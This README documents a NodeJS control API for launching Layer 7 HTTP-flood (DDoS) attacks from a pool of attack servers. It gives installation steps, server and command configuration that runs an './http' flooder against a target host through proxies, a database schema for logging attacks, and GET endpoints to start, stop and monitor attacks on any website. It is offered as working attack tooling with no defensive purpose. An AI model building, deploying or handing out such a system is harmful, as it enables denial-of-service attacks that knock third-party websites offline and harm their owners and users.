<h2>NodeJS API for Layer 7 attacks (Updated 25 Feb, 2024)</h2>

<h3>Coded by forky (tg: @yfork)</h3>

<h4>This API is very secure and fast (takes 2x the ping between the API and the backend, i.e. the ping is 60ms it will take only 120ms to launch the attack)</h4>


<h1>Installation:</h1>

```sh
curl -fsSL https://deb.nodesource.com/setup_21.x | sudo -E bash - &&\
sudo apt-get install -y nodejs
npm i express mysql
```

<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
{
    "1": {
        "name": "1",
        "host": "1.1.1.1",
        "port": 3000,
        "slots": 15
    },
    "2": {
        "name": "2",
        "host": "2.2.2.2",
        "port": 3000,
        "slots": 15
    }
}
```

<h3>Update commands.json</h3><br>

```json
{
    "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}"
}
```

<h3>Update settings.json</h3><br>

```json
{
    "database": {
        "host": "localhost",
        "user": "DATABASE_USER",
        "password": "DATABASE_PASSWORD",
        "database": "DATABASE_NAME"
    },
    "socket_token": "SECRET_TOKEN", 
    "api_port": 3000
}
```

<h3>Update client.js:</h3><br>

```js
const socket_port = 3000;
const socket_token = "SOCKET_TOKEN";
const allowed_ips = ['1.1.1.1'];
```

<h3>Setup the Database</h3><br>

```sql
CREATE DATABASE manager;

use manager;

CREATE TABLE `attacks` (
    `id` int(11) NOT NULL,
    `server` varchar(300) DEFAULT NULL,
    `target` text DEFAULT NULL,
    `duration` int(11) NOT NULL,
    `method` varchar(255) DEFAULT NULL,
    `date_sent` int(11) DEFAULT NULL,
    `stopped` int(11) NOT NULL DEFAULT 0,
    `attack_id` int(11) DEFAULT NULL
);

ALTER TABLE `attacks` ADD PRIMARY KEY (`id`);

ALTER TABLE `attacks` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
```

## After that, upload socket.js to the attack servers and upload api.js, servers.json and commands.json to the API server


### Reverse Proxy

Making a reverse proxy using Nginx to use your API is recommended:

```conf
server {
    listen 80;
    server_name api.yourdomain.com;
    location /api/attack {
        proxy_pass http://backend:3000/api/attack;
    }
}
```

Replace `'http://backend:3000/api/attack'` with your API server URL

### Using the API

Send a GET request to the API using the required fields

GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=HTTPGET`

You can stop the attacks by sending a GET request to the API using the attack ID

GET `https://api.yourdomain.com/api/stop?attack_id=[id]`

You can also view all running attacks and server usage by sending a GET request to the API

GET `https://api.yourdomain.com/api/status`

You can also stop all the attacks sending a GET request to the API

GET `https://api.yourdomain.com/api/stop_all`

